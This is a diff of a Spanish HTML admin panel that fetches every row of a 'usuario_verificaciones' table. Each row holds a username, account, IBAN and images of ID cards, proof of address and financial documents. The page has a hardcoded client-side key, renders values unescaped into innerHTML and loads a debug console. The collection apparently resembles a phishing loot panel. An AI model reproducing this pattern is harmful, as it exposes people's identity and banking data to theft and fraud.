@@ -2,24 +2,20 @@
 <html lang="es">
 <head>
 <meta charset="UTF-8">
-<title>Panel Administrador</title>
-
+<title>Administrador de Verificaciones</title>
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-
 <style>
-  body { font-family: Arial; background:#eef2f7; padding:20px; }
+  body { font-family: Arial; background:#f4f4f4; margin:0; padding:20px; }
   h1 { text-align:center; color:#003366; }
-  table { width:100%; border-collapse:collapse; margin-top:20px; }
-  th, td { border:1px solid #ccc; padding:10px; text-align:left; }
-  th { background:#003366; color:white; }
-  img { width:120px; border-radius:6px; }
+  table { width:100%; border-collapse:collapse; margin-top:20px; background:#fff; }
+  th, td { border:1px solid #ccc; padding:10px; text-align:center; }
+  img { max-width:150px; border-radius:6px; }
 </style>
 </head>
 <body>
 
-<h1>Panel Administrador</h1>
-
-<table>
+<h1>Administrador de Verificaciones</h1>
+<table id="tabla">
   <thead>
     <tr>
       <th>ID</th>
@@ -33,48 +29,45 @@
       <th>Fecha</th>
     </tr>
   </thead>
-  <tbody id="tabla"></tbody>
+  <tbody></tbody>
 </table>
 
 <script>
 const SUPABASE_URL = "https://iomxopcdoygphvulaswb.supabase.co";
 const SUPABASE_ANON_KEY = "sb_publishable_4KqCEnqLVSEETOob_X9c7w_4IOpToI-";
-
 const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
 async function cargarRegistros() {
-  const { data, error } = await supabase
-    .from("usuario_verificaciones")
-    .select("*");
-
+  const { data, error } = await supabase.from("usuario_verificaciones").select("*");
   if (error) {
-    alert("❌ Error al leer datos: " + error.message);
-    console.error(error);
+    alert("❌ Error al cargar: " + error.message);
     return;
   }
 
-  const tabla = document.getElementById("tabla");
-  tabla.innerHTML = "";
-
-  data.forEach(reg => {
-    tabla.innerHTML += `
+  const tbody = document.querySelector("#tabla tbody");
+  tbody.innerHTML = "";
+  data.forEach(r => {
+    const fila = `
       <tr>
-        <td>${reg.id}</td>
-        <td>${reg.usuario}</td>
-        <td>${reg.cuenta}</td>
-        <td>${reg.iban}</td>
-        <td><img src="${reg.frontal}"></td>
-        <td><img src="${reg.trasera}"></td>
-        <td><img src="${reg.domicilio}"></td>
-        <td><img src="${reg.finanzas}"></td>
-        <td>${reg.fecha}</td>
+        <td>${r.id}</td>
+        <td>${r.usuario}</td>
+        <td>${r.cuenta}</td>
+        <td>${r.iban}</td>
+        <td><img src="${r.frontal}" alt="Frontal"></td>
+        <td><img src="${r.trasera}" alt="Trasera"></td>
+        <td><img src="${r.domicilio}" alt="Domicilio"></td>
+        <td><img src="${r.finanzas}" alt="Finanzas"></td>
+        <td>${r.fecha}</td>
       </tr>
     `;
+    tbody.innerHTML += fila;
   });
 }
 
 cargarRegistros();
 </script>
 
+<script src="https://cdn.jsdelivr.net/npm/eruda"></script>
+<script>eruda.init();</script>
 </body>
 </html>
